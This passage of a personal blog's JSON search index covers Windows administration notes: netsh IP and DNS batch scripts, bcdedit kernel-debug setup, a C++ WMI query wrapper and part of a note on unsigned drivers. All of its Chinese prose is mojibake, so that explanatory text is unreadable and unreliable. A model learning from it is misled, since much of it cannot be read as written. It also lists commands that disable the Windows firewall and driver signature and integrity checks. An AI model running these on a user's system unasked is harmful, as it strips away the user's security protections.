€‘netshç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:01.980Z","path":"A_OS/Windows/cmd/netshç”¨æ³•æ•´ç†/","text":"Netsh æ˜¯å‘½ä»¤è¡Œè„šæœ¬å®ç”¨å·¥å…·ï¼Œå¯è®©ä½ æ˜¾ç¤ºæˆ–ä¿®æ”¹å½“å‰æ­£åœ¨è¿è¡Œçš„è®¡ç®—æœºçš„ç½‘ç»œé…ç½®ã€‚ å¯ä»¥é€šè¿‡åœ¨ netsh æç¤ºç¬¦ä¸‹é”®å…¥å‘½ä»¤æ¥è¿è¡Œ Netsh å‘½ä»¤ï¼Œå¹¶ä¸”å¯ä»¥åœ¨æ‰¹å¤„ç†æ–‡ä»¶æˆ–è„šæœ¬ä¸­ä½¿ç”¨ Netsh å‘½ä»¤ã€‚ å¯ä»¥ä½¿ç”¨ netsh å‘½ä»¤æ¥é…ç½®è¿œç¨‹è®¡ç®—æœºå’Œæœ¬åœ°è®¡ç®—æœºã€‚ Netsh è¿˜æä¾›è„šæœ¬åŠŸèƒ½ï¼Œå¯è®©ä½ åœ¨æ‰¹å¤„ç†æ¨¡å¼ä¸‹å¯¹æŒ‡å®šçš„è®¡ç®—æœºè¿è¡Œä¸€ç»„å‘½ä»¤ã€‚ ä½ å¯ä»¥ä½¿ç”¨ Netsh å°†é…ç½®è„šæœ¬ä¿å­˜åœ¨æ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿å­˜æ¡£æˆ–è€…å¸®åŠ©ä½ é…ç½®å…¶ä»–è®¡ç®—æœºã€‚ ä¸€ã€å¦‚ä½•æ­£ç¡®ä½¿ç”¨netsh å½“æˆ‘ä»¬å¿˜è®°netshçš„ç›¸å…³å‘½ä»¤æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨netshè‡ªå¸¦çš„å¸®åŠ©åŠŸèƒ½ï¼Œå°±èƒ½çœ‹åˆ°ä¸€äº›å¯ä»¥ä½¿ç”¨çš„å‘½ä»¤ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546netsh /?C:\\Users\\ming Ming&gt;netsh /?Usage: netsh [-a AliasFile] [-c Context] [-r RemoteMachine] [-u [DomainName\\]UserName] [-p Password | *] [Command | -f ScriptFile]The following commands are available:Commands in this context:? - Displays a list of commands.add - Adds a configuration entry to a list of entries.advfirewall - Changes to the `netsh advfirewall&#x27; context.bridge - Changes to the `netsh bridge&#x27; context.delete - Deletes a configuration entry from a list of entries.dhcpclient - Changes to the `netsh dhcpclient&#x27; context.dnsclient - Changes to the `netsh dnsclient&#x27; context.dump - Displays a configuration script.exec - Runs a script file.firewall - Changes to the `netsh firewall&#x27; context.help - Displays a list of commands.http - Changes to the `netsh http&#x27; context.interface - Changes to the `netsh interface&#x27; context.ipsec - Changes to the `netsh ipsec&#x27; context.lan - Changes to the `netsh lan&#x27; context.mbn - Changes to the `netsh mbn&#x27; context.namespace - Changes to the `netsh namespace&#x27; context.netio - Changes to the `netsh netio&#x27; context.nlm - Changes to the `netsh nlm&#x27; context.p2p - Changes to the `netsh p2p&#x27; context.ras - Changes to the `netsh ras&#x27; context.rpc - Changes to the `netsh rpc&#x27; context.set - Updates configuration settings.show - Displays information.trace - Changes to the `netsh trace&#x27; context.wcn - Changes to the `netsh wcn&#x27; context.wfp - Changes to the `netsh wfp&#x27; context.winhttp - Changes to the `netsh winhttp&#x27; context.winsock - Changes to the `netsh winsock&#x27; context.wlan - Changes to the `netsh wlan&#x27; context.The following sub-contexts are available: advfirewall bridge dhcpclient dnsclient firewall http interface ipsec lan mbn namespace netio nlm p2p ras rpc trace wcn wfp winhttp winsock wlanTo view help for a command, type the command, followed by a space, and then type ?. é‚£çŸ¥é“æœ‰å“ªäº›å¯é€‰åŠŸèƒ½åï¼Œæˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥è¾“å…¥äºŒçº§å‘½ä»¤å»æ‰§è¡Œæˆ‘ä»¬å°†è¦è¿›è¡Œçš„æ“ä½œï¼Œæ¯”å¦‚ä¸‹è¾¹æˆ‘å°±ä»¥æŸ¥çœ‹å½“å‰tcpé“¾æ¥çŠ¶æ€ä½åˆ—å±•ç¤ºï¼š 1234567891011121314151617181920212223242526$&gt;netsh$netsh&gt;int$netsh interface&gt;ip$netsh interface ipv4&gt;show tcpstatsTCP Statistics------------------------------------------------------Timeout Algorithm: Van Jacobson&#x27;s AlgorithmMinimum Timeout: 5Maximum Timeout: 4294967295Maximum Connections: DynamicActive Opens: 3971Passive Opens: 556Attempts Failed: 1017Established Resets: 407Currently Established: 34In Segments: 202193Out Segments: 149657Retransmitted Segments: 0In Errors: 0Out Resets: 845Fastopen Active Opens: 0Fastopen Passive Opens: 0Fastopen Attempts Failed: 0Retransmits Of First SYN: 644Retransmits Of First SYN (Fastopen): 0 äºŒã€netshå‘½ä»¤æ•´ç† 1. å¯¼å‡ºå¯¼å…¥è„šæœ¬ å¯¼å‡ºé…ç½®è„šæœ¬ï¼š 1netsh -c interface ip dump &gt; c:/interface.txt å¯¼å…¥é…ç½®è„šæœ¬ï¼š 1netsh -f c:/interface.txt 2. å›ºå®šIPåœ°å€æ‰¹å¤„ç† //SETIPDNS.batï¼ˆ â€œæœ¬åœ°è¿æ¥â€æ¢æˆä½ ç½‘å¡çš„åå­—, å…·ä½“çš„ ip åœ°å€ï¼Œç½‘å…³ï¼Œè¯·è‡ªè¡Œä¿®æ”¹ ï¼‰ 12345678910111213141516171819202122232425@echo offecho æ­£åœ¨ä¿®æ”¹æœ¬æœºIP...netsh interface ip set address name=&quot;æœ¬åœ°è¿æ¥&quot; source=static 192.168.1.188 255.255.255.0 192.168.1.1 1echo æ­£åœ¨æ·»åŠ æœ¬æœºä¸»DNS...netsh interface ip set dns &quot;æœ¬åœ°è¿æ¥&quot; static 18.0.0.10 primaryecho æ­£åœ¨æ·»åŠ æœ¬æœºå‰¯DNS...netsh interface ip add dns &quot;æœ¬åœ°è¿æ¥&quot; 18.0.0.10echo è®¾ç½®å®Œæˆ...echo æ£€æŸ¥å½“å‰æœ¬æœºé…ç½®...ipconfig /allecho å¯¼å‡ºé…ç½®è„šæœ¬...netsh -c interface ip dumppause 3. è‡ªåŠ¨è·å– IP 123456789101112131415161718192021@echo offecho æ­£åœ¨ä¿®æ”¹æœ¬æœºIP...netsh interface ip set address name=&quot;æœ¬åœ°è¿æ¥&quot; source=dhcpecho æ­£åœ¨æ·»åŠ æœ¬æœºä¸»DNS...netsh interface ip set dns &quot;æœ¬åœ°è¿æ¥&quot; dhcpecho è®¾ç½®å®Œæˆ...echo æ£€æŸ¥å½“å‰æœ¬æœºé…ç½®...ipconfig /allecho å¯¼å‡ºé…ç½®è„šæœ¬...netsh -c interface ip dumppause 4. netshç”¨æ³• æŸ¥çœ‹ç½‘ç»œé…ç½® 123456789101112131415161718netsh interface ip show &#123;é€‰é¡¹&#125;&#123;é€‰é¡¹&#125;å¯ä»¥æ˜¯ï¼šaddress-æ˜¾ç¤ºIPåœ°å€é…ç½®ã€‚config-æ˜¾ç¤ºIPåœ°å€å’Œæ›´å¤šä¿¡æ¯ã€‚dns-æ˜¾ç¤ºDNSæœåŠ¡å™¨åœ°å€ã€‚icmp-æ˜¾ç¤ºICMPç»Ÿè®¡ã€‚interface-æ˜¾ç¤ºIPæ¥å£ç»Ÿè®¡ã€‚ipaddress-æ˜¾ç¤ºå½“å‰IPåœ°å€ã€‚ipnet-æ˜¾ç¤ºIPçš„ç½‘ç»œåˆ°åª’ä½“çš„æ˜ å°„ã€‚ipstats-æ˜¾ç¤ºIPç»Ÿè®¡ã€‚joins-æ˜¾ç¤ºåŠ å…¥çš„å¤šæ’­ç»„ã€‚offload-æ˜¾ç¤ºå¸è½½ä¿¡æ¯ã€‚tcpconn-æ˜¾ç¤ºTCPè¿æ¥ã€‚tcpstats-æ˜¾ç¤ºTCPç»Ÿè®¡ã€‚udpconn-æ˜¾ç¤ºUDPè¿æ¥ã€‚udpstats-æ˜¾ç¤ºUDPç»Ÿè®¡ã€‚wins-æ˜¾ç¤ºWINSæœåŠ¡å™¨åœ°å€ã€‚ æŸ¥çœ‹ç½‘ç»œé…ç½® 123456789101112131415161718netsh interface ip show &#123;é€‰é¡¹&#125;&#123;é€‰é¡¹&#125;å¯ä»¥æ˜¯ï¼šaddress-æ˜¾ç¤ºIPåœ°å€é…ç½®ã€‚config-æ˜¾ç¤ºIPåœ°å€å’Œæ›´å¤šä¿¡æ¯ã€‚dns-æ˜¾ç¤ºDNSæœåŠ¡å™¨åœ°å€ã€‚icmp-æ˜¾ç¤ºICMPç»Ÿè®¡ã€‚interface-æ˜¾ç¤ºIPæ¥å£ç»Ÿè®¡ã€‚ipaddress-æ˜¾ç¤ºå½“å‰IPåœ°å€ã€‚ipnet-æ˜¾ç¤ºIPçš„ç½‘ç»œåˆ°åª’ä½“çš„æ˜ å°„ã€‚ipstats-æ˜¾ç¤ºIPç»Ÿè®¡ã€‚joins-æ˜¾ç¤ºåŠ å…¥çš„å¤šæ’­ç»„ã€‚offload-æ˜¾ç¤ºå¸è½½ä¿¡æ¯ã€‚tcpconn-æ˜¾ç¤ºTCPè¿æ¥ã€‚tcpstats-æ˜¾ç¤ºTCPç»Ÿè®¡ã€‚udpconn-æ˜¾ç¤ºUDPè¿æ¥ã€‚udpstats-æ˜¾ç¤ºUDPç»Ÿè®¡ã€‚wins-æ˜¾ç¤ºWINSæœåŠ¡å™¨åœ°å€ã€‚ é…ç½®æ¥å£IP/ç½‘å…³IP 1netsh interface ip set address &quot;æœ¬åœ°è¿æ¥&quot; static 10.1.2.90 255.255.255.0 10.1.2.254 1 é…ç½®è‡ªåŠ¨æ¢å–IPåœ°å€,DNSåœ°å€åŠwinsåœ°å€ 123netsh interface ip set address &quot;æœ¬åœ°è¿æ¥&quot; dhcpnetsh interface ip set dns &quot;æœ¬åœ°è¿æ¥&quot; dhcpnetsh interface ip set wins &quot;æœ¬åœ°è¿æ¥&quot; dhcp é…ç½®é™æ€IPåœ°å€ï¼ŒDNSåœ°å€åŠwinsåœ°å€ 123netsh interface ip set address &quot;æœ¬åœ°è¿æ¥&quot; static 10.1.2.90netsh interface ip set dns &quot;æœ¬åœ°è¿æ¥&quot; static 202.99.160.68netsh interface ip set wins &quot;æœ¬åœ°è¿æ¥&quot; static 10.1.2.200 çœ‹ç½‘ç»œé…ç½®æ–‡ä»¶ 1C:&gt;netsh -c interface dump å¯¼å‡ºç½‘ç»œé…ç½®æ–‡ä»¶ 1netsh -c interface dump &gt; d:/1.txt å¯¼å…¥ç½‘ç»œé…ç½®æ–‡ä»¶ 12netsh -f d:/1.txtnetsh exec d:/2.txt netsh é…ç½®é˜²ç«å¢™ æŸ¥çœ‹ã€å¼€å¯æˆ–ç¦ç”¨ç³»ç»Ÿé˜²ç«å¢™ 12345678# æŸ¥çœ‹é˜²ç«å¢™çš„çŠ¶æ€netsh firewall show state# ç¦ç”¨ç³»ç»Ÿé˜²ç«å¢™netsh firewall set opmode disable# å¯ç”¨é˜²ç«å¢™netsh firewall set opmode enable","tags":[{"name":"windows/CMD","slug":"windows-CMD","permalink":"https://hodlyounger.github.io/tags/windows-CMD/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"ã€Windowsã€‘ã€cmdã€‘bcdedit ç”¨æ³•æ•´ç†","date":"2023-10-27T01:24:01.979Z","path":"A_OS/Windows/cmd/ã€Windowsã€‘ã€cmdã€‘bcdedit/","text":"æ¦‚è¿°ï¼šbdceditç”¨æ³•æ•´ç†|åŒæœºè°ƒè¯• æ›´å¤šå‘½ä»¤ï¼šhttps://docs.microsoft.com/zh-cn/windows-hardware/drivers/devtest/bcdeditâ€“bootdebug [toc] ç¦ç”¨æ•°å­—ç­¾å 1bcdedit /set testsigning on windowsæ“ä½œæä¾›å†…æ ¸è°ƒè¯• 12bcdedit /debug on # å¯åŠ¨bcdedit /debug off # ç¦ç”¨ windowsæ“ä½œç³»ç»Ÿå¯åŠ¨é¡¹çš„å¯åŠ¨è°ƒè¯• 12bcdedit /bootdebug on # å¯ç”¨bcdedit /bootdebug off # ç¦ç”¨ æ°¸ä¹…ç¦ç”¨æ•°å­—ç­¾åæ–¹æ³• ç®¡ç†å‘˜CMD è¾“å…¥ bcdedit.exe /set nointegritychecks onï¼Œæ‰§è¡Œå®Œæ¯•å°±ç»“æŸäº† å¦‚æœè¦æ¢å¤ç­¾åï¼Œæ‰§è¡Œ bcdedit.exe /set nointegritychecks offå°±è¡Œ windbgå’Œè™šæ‹Ÿæœºçš„è¿œç¨‹è°ƒè¯•å’Œç½‘ç»œè°ƒè¯•è®¾ç½® å‚è€ƒï¼šwindbgå’Œè™šæ‹Ÿæœºä¸‹çš„è¿œç¨‹è°ƒè¯•å’Œç½‘ç»œè°ƒè¯•è®¾ç½®_windbgè°ƒè¯•è™šæ‹Ÿæœº_satadriverçš„åšå®¢-CSDNåšå®¢ å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼šBCDEdit /dbgsettings - Windows drivers | Microsoft Learn WDFåŒæœºè°ƒè¯• å‚è€ƒï¼šWDK1.2. bcdeditè°ƒè¯•é…ç½®_bcdedit /dbgsettings hostip_ljymoonlightçš„åšå®¢-CSDNåšå®¢ åŒæœºè°ƒè¯•åŸºæœ¬æ­¥éª¤ ç½‘ç»œè¿æ¥ è™šæ‹Ÿæœºè®¾ç½® 1234567891011# 1. æ‰“å¼€è°ƒè¯•æ¨¡å¼bcdedit /debug on# 2. è®¾ç½®ç½‘ç»œæ–¹å¼è°ƒè¯•# hostipï¼šä¸»æœºIPåœ°å€# port: ä¸»æœºçš„ç«¯å£# keyï¼š(å¯çœç•¥) ç™»å½•å¯†ç bcdedit /dbgsettings net hostip:192.168.0.102 port:50000 key:1.2.3.4#3. è®¾ç½®æ•°å­—ç­¾åbcdedit /set testsigning on ä¸»æœºwindbgè¿æ¥è™šæ‹Ÿæœº å¦‚ä¸‹å›¾æ‰€ç¤ºå¡«å…¥ä¸Šè¿°å¾—åˆ°keyæˆ–è‡ªå®šä¹‰è®¾ç½®çš„keyä¹‹åè¿æ¥å³å¯ã€‚ ä¸²å£è°ƒè¯• æ·»åŠ ä¸²è¡Œè°ƒè¯•ç«¯å£ è®¾ç½®ç®¡é“åï¼Œå¹¶åˆ é™¤æ‰“å°æœº æŸ¥çœ‹ç®¡é“å è™šæ‹Ÿæœºè®¾ç½® ç®¡ç†å‘˜cmd ä¾æ¬¡è¾“å…¥ä»¥ä¸‹æŒ‡ä»¤ 12345# æ·»åŠ æ–°çš„å¼•å¯¼é¡¹bcdedit /copy &#123;current&#125; /d Debug# è®¾ç½®å¼•å¯¼é¡¹ç­‰å¾…æ—¶é—´bcdedit /timeout 30 é‡å¯æ“ä½œç³»ç»Ÿå¹¶å†æ¬¡ç®¡ç†å‘˜è¿è¡ŒCMD ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ 12345bcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200bcdedit /bootdebug onbcdedit /debug on è¿è¡Œ â€˜msconfigâ€™ win+R è¾“å…¥ msconfig æŸ¥çœ‹å¼•å¯¼é¡¹æ˜¯å¦æœ‰Debugæ¨¡å¼ æŸ¥çœ‹é«˜çº§é€‰é¡¹ï¼Œè°ƒè¯•ç«¯å£å’Œæ³¢ç‰¹ç‡ åˆ°æ­¤ä¸ºæ­¢ï¼Œè™šæ‹Ÿæœºè®¾ç½®å®Œæ¯•ï¼Œå¯åŠ¨åæ“ä½œç³»ç»Ÿå¯åŠ¨æ—¶é€‰æ‹© Debug Windbgè¿æ¥ è¿æ¥å†…æ ¸ è®¾ç½®ç®¡é“å","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"cmd","slug":"cmd","permalink":"https://hodlyounger.github.io/tags/cmd/"},{"name":"windows/cmd","slug":"windows-cmd","permalink":"https://hodlyounger.github.io/tags/windows-cmd/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"cmd","slug":"A-OS/Windows/cmd","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/cmd/"}]},{"title":"winuserè¯´æ˜","date":"2023-10-27T01:24:01.971Z","path":"A_OS/Windows/WinUser/winuserä»‹ç»/","text":"Winuser.h æ ‡å¤´ - Win32 apps | Microsoft Learn [toc] winuser ç›¸å…³å‡½æ•°è¯´æ˜ GetSystemMetrics GetSystemMetrics å‡½æ•° (winuser.h) - Win32 apps | Microsoft Learn æ£€ç´¢æŒ‡å®šçš„ç³»ç»ŸæŒ‡æ ‡æˆ–ç³»ç»Ÿé…ç½®è®¾ç½®ã€‚ è¯·æ³¨æ„ï¼Œ GetSystemMetrics æ£€ç´¢çš„æ‰€æœ‰ç»´åº¦éƒ½ä»¥åƒç´ ä¸ºå•ä½ã€‚ 12int iconWidth = GetSystemMetrics(SM_CXSMICON); // å›¾æ ‡åŸºå‡†å®½åº¦ int iconHeight = GetSystemMetrics(SM_CYSMICON); // å›¾æ ‡åŸºå‡†é«˜åº¦","tags":[{"name":"windows/winuser","slug":"windows-winuser","permalink":"https://hodlyounger.github.io/tags/windows-winuser/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"WinUser","slug":"A-OS/Windows/WinUser","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/WinUser/"}]},{"title":"ã€windowsã€‘ã€wmiã€‘ExecQueryçš„ç®€å•å°è£…","date":"2023-10-27T01:24:01.970Z","path":"A_OS/Windows/WMI/WMI execquery æ¥å£å°è£…/","text":"æ¦‚è¿°ï¼šwmiçš„ç®€å•å°è£…ï¼Œä¸»è¦å®ç°æŸ¥è¯¢åŠŸèƒ½ï¼Œå³ ExecQuery æ¥å£ å®ç° å¤´æ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364/*************************************************************************************************** File Name : WMIInof.h** Created : 2023/10/19** Author : holdyounger** Model :** Description : simple wmi execquery***************************************************************************************************/#ifndef _WMIINFO_H_#define _WMIINFO_H_#include &lt;WbemIdl.h&gt;#pragma comment(lib,&quot;WbemUuid.lib&quot;)class CWmiInfo&#123;public: CWmiInfo(); ~CWmiInfo();public: HRESULT InitWmi(); //åˆå§‹åŒ–WMI HRESULT ReleaseWmi(); //é‡Šæ”¾ /*è·å–ä¸€ä¸ªç±»æˆå‘˜ *@param [in ] ClassName Example: &quot;Win32_Processor&quot; *@param [in ] ClassMember Example: &quot;SerialNumber&quot; *@param [out] chRetValue *@param return TRUE success; false fail Example: CString strRetValue; GetSingleItemInfo(_T(&quot;Win32_Processor&quot;),_T(&quot;Caption&quot;),strRetValue); */ BOOL GetSingleItemInfo(CString ClassName,CString ClassMember,CString &amp;chRetValue); /*è·å–ä¸€ä¸ªç±»çš„å¤šä¸ªæˆå‘˜ *@param [in ] ClassName Example: &quot;Win32_Processor&quot; *@param [in ] ClassMember Example: &quot;SerialNumber&quot; *@param [in ] n æˆå‘˜ä¸ªæ•° *@param [out] chRetValue *@param return TRUE success; false fail Example: CString strRetValue;CString [] strClassMem = &#123;_T(&quot;Caption&quot;),_T(&quot;CurrentClockSpeed&quot;),_T(&quot;DeviceID&quot;),_T(&quot;Manufacturer&quot;),_T(&quot;Manufacturer&quot;)&#125;; GetGroupItemInfo(_T(&quot;Win32_Processor&quot;),strClassMem,5,strRetValue); */ BOOL GetGroupItemInfo(CString ClassName,CString ClassMember[],int n,CString &amp;chRetValue);private: void VariantToString(const LPVARIANT,CString &amp;) const;//å°†Variantç±»å‹çš„å˜é‡è½¬æ¢ä¸ºCStringprivate: IEnumWbemClassObject* m_pEnumClsObj; IWbemClassObject* m_pWbemClsObj; IWbemServices* m_pWbemSvc; IWbemLocator* m_pWbemLoc;&#125;;#endif æºæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268#include &quot;stdafx.h&quot;#include &quot;WmiInfo.h&quot;CWmiInfo::CWmiInfo(void)&#123; m_pWbemSvc=NULL; m_pWbemLoc=NULL; m_pEnumClsObj = NULL;&#125;CWmiInfo::~CWmiInfo(void)&#123; m_pWbemSvc=NULL; m_pWbemLoc=NULL; m_pEnumClsObj = NULL;&#125;HRESULT CWmiInfo::InitWmi()&#123; HRESULT hr; //ä¸€ã€åˆå§‹åŒ–COMç»„ä»¶ //åˆå§‹åŒ–COM hr=::CoInitializeEx(0,COINIT_MULTITHREADED); if (SUCCEEDED(hr) || RPC_E_CHANGED_MODE == hr) &#123; //è®¾ç½®è¿›ç¨‹çš„å®‰å…¨çº§åˆ«ï¼Œï¼ˆè°ƒç”¨COMç»„ä»¶æ—¶åœ¨åˆå§‹åŒ–COMä¹‹åè¦è°ƒç”¨CoInitializeSecurityè®¾ç½®è¿›ç¨‹å®‰å…¨çº§åˆ«ï¼Œå¦åˆ™ä¼šè¢«ç³»ç»Ÿè¯†åˆ«ä¸ºç—…æ¯’ï¼‰ hr=CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL); //VERIFY(SUCCEEDED(hr)); //äºŒã€åˆ›å»ºä¸€ä¸ªWMIå‘½åç©ºé—´è¿æ¥ //åˆ›å»ºä¸€ä¸ªCLSID_WbemLocatorå¯¹è±¡ hr=CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&amp;m_pWbemLoc);// VERIFY(SUCCEEDED(hr)); //ä½¿ç”¨m_pWbemLocè¿æ¥åˆ°&quot;root\\cimv2&quot;å¹¶è®¾ç½®m_pWbemSvcçš„æŒ‡é’ˆ hr=m_pWbemLoc-&gt;ConnectServer(CComBSTR(L&quot;ROOT\\\\CIMV2&quot;), NULL, NULL, 0, NULL, 0, 0, &amp;m_pWbemSvc);// VERIFY(SUCCEEDED(hr)); //ä¸‰ã€è®¾ç½®WMIè¿æ¥çš„å®‰å…¨æ€§ hr=CoSetProxyBlanket(m_pWbemSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);// VERIFY(SUCCEEDED(hr)); &#125; return(hr);&#125;HRESULT CWmiInfo::ReleaseWmi()&#123; HRESULT hr; if (NULL != m_pWbemSvc) &#123; hr=m_pWbemSvc-&gt;Release(); &#125; if (NULL != m_pWbemLoc) &#123; hr=m_pWbemLoc-&gt;Release(); &#125; if (NULL != m_pEnumClsObj) &#123; hr=m_pEnumClsObj-&gt;Release(); &#125; ::CoUninitialize(); return(hr);&#125;BOOL CWmiInfo::GetSingleItemInfo(CString ClassName,CString ClassMember,CString &amp;chRetValue)&#123; USES_CONVERSION; CComBSTR query(&quot;SELECT * FROM &quot;); VARIANT vtProp; ULONG uReturn; HRESULT hr; BOOL bRet = FALSE; if (NULL != m_pWbemSvc) &#123; //æŸ¥è¯¢ç±»ClassNameä¸­çš„æ‰€æœ‰å­—æ®µ,ä¿å­˜åˆ°m_pEnumClsObjä¸­ query+=CComBSTR(ClassName); hr=m_pWbemSvc-&gt;ExecQuery(CComBSTR(&quot;WQL&quot;),query,WBEM_FLAG_FORWARD_ONLY|WBEM_FLAG_RETURN_IMMEDIATELY, 0,&amp;m_pEnumClsObj); if (SUCCEEDED(hr)) &#123; //åˆå§‹åŒ–vtPropå€¼ VariantInit(&amp;vtProp); uReturn=0; //è¿”å›ä»å½“å‰ä½ç½®èµ·çš„ç¬¬ä¸€ä¸ªå¯¹è±¡åˆ°m_pWbemClsObjä¸­ hr=m_pEnumClsObj-&gt;Next(WBEM_INFINITE,1,&amp;m_pWbemClsObj,&amp;uReturn); if(SUCCEEDED(hr)&amp;&amp;uReturn&gt;0) &#123; //ä»m_pWbemClsObjä¸­æ‰¾å‡ºClassMemberæ ‡è¯†çš„æˆå‘˜å±æ€§å€¼,å¹¶ä¿å­˜åˆ°vtPropå˜é‡ä¸­ hr=m_pWbemClsObj-&gt;Get(CComBSTR(ClassMember),0,&amp;vtProp,0,0); if (SUCCEEDED(hr)) &#123; VariantToString(&amp;vtProp,chRetValue); VariantClear(&amp;vtProp);//æ¸…ç©ºvtProp bRet = TRUE; &#125; &#125; &#125; &#125; if(NULL != m_pEnumClsObj) &#123; hr=m_pEnumClsObj-&gt;Release(); m_pEnumClsObj = NULL; &#125; if(NULL != m_pWbemClsObj) &#123; hr=m_pWbemClsObj-&gt;Release(); m_pWbemClsObj = NULL; &#125; return bRet;&#125;BOOL CWmiInfo::GetGroupItemInfo(CString ClassName,CString ClassMember[],int n,CString &amp;chRetValue)&#123; USES_CONVERSION; CComBSTR query(&quot;SELECT * FROM &quot;); CString result,info; VARIANT vtProp; ULONG uReturn; HRESULT hr; int i; BOOL bRet = FALSE; if (NULL != m_pWbemSvc) &#123; query+=CComBSTR(ClassName); hr=m_pWbemSvc-&gt;ExecQuery(CComBSTR(&quot;WQL&quot;),query,WBEM_FLAG_FORWARD_ONLY|WBEM_FLAG_RETURN_IMMEDIATELY,0,&amp;m_pEnumClsObj); if (SUCCEEDED(hr)) &#123; VariantInit(&amp;vtProp); //åˆå§‹åŒ–vtPropå˜é‡ if(m_pEnumClsObj) &#123; Sleep(10); uReturn=0; hr=m_pEnumClsObj-&gt;Next(WBEM_INFINITE,1,&amp;m_pWbemClsObj,&amp;uReturn); if (SUCCEEDED(hr) &amp;&amp;uReturn&gt;0) &#123; for(i=0;i&lt;n;++i) &#123; hr=m_pWbemClsObj-&gt;Get(CComBSTR(ClassMember[i]),0,&amp;vtProp,0,0); if (SUCCEEDED(hr)) &#123; VariantToString(&amp;vtProp,info); chRetValue+=info+_T(&quot;\\t&quot;); VariantClear(&amp;vtProp); bRet = TRUE; &#125; &#125; chRetValue+=_T(&quot;\\r\\n&quot;); &#125; &#125; &#125; &#125; if(NULL != m_pEnumClsObj) &#123; hr=m_pEnumClsObj-&gt;Release(); m_pEnumClsObj=NULL; &#125; if(NULL != m_pWbemClsObj) &#123; hr=m_pWbemClsObj-&gt;Release(); m_pWbemClsObj=NULL; &#125; return bRet;&#125;void CWmiInfo::VariantToString(const LPVARIANT pVar,CString &amp;chRetValue) const&#123; USES_CONVERSION; CComBSTR HUGEP* pBstr; BYTE HUGEP* pBuf; LONG low,high,i; HRESULT hr; switch(pVar-&gt;vt) &#123; case VT_BSTR: &#123; chRetValue=W2T(pVar-&gt;bstrVal); &#125; break; case VT_BOOL: &#123; if(VARIANT_TRUE==pVar-&gt;boolVal) chRetValue=&quot;æ˜¯&quot;; else chRetValue=&quot;å¦&quot;; &#125; break; case VT_I4: &#123; chRetValue.Format(_T(&quot;%d&quot;),pVar-&gt;lVal); &#125; break; case VT_UI1: &#123; chRetValue.Format(_T(&quot;%d&quot;),pVar-&gt;bVal); &#125; break; case VT_UI4: &#123; chRetValue.Format(_T(&quot;%d&quot;),pVar-&gt;ulVal); &#125; break; case VT_BSTR|VT_ARRAY: &#123; hr=SafeArrayAccessData(pVar-&gt;parray,(void HUGEP**)&amp;pBstr); hr=SafeArrayUnaccessData(pVar-&gt;parray); chRetValue=W2T(pBstr-&gt;m_str); &#125; break; case VT_I4|VT_ARRAY: &#123; SafeArrayGetLBound(pVar-&gt;parray,1,&amp;low); SafeArrayGetUBound(pVar-&gt;parray,1,&amp;high); hr=SafeArrayAccessData(pVar-&gt;parray,(void HUGEP**)&amp;pBuf); hr=SafeArrayUnaccessData(pVar-&gt;parray); CString strTmp; high=min(high,MAX_PATH*2-1); for(i=low;i&lt;=high;++i) &#123; strTmp.Format(_T(&quot;%02X&quot;),pBuf[i]); chRetValue+=strTmp; &#125; &#125; break; default: break; &#125;&#125; ä½¿ç”¨ 1","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"Windows/wmi","slug":"Windows-wmi","permalink":"https://hodlyounger.github.io/tags/Windows-wmi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"WMI","slug":"A-OS/Windows/WMI","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/WMI/"}]},{"title":"Win7 ä½¿ç”¨æœªç­¾åé©±åŠ¨ç¨‹åº","date":"2023-10-27T01:24:01.970Z","path":"A_OS/Windows/é©±åŠ¨/ã€winã€‘Win7 é©±åŠ¨æœªç­¾åå¦‚ä½•ä½¿ç”¨/","text":"win7ä½¿ç”¨æœªç­¾åé©±åŠ¨ç¨‹åº æ“ä½œ 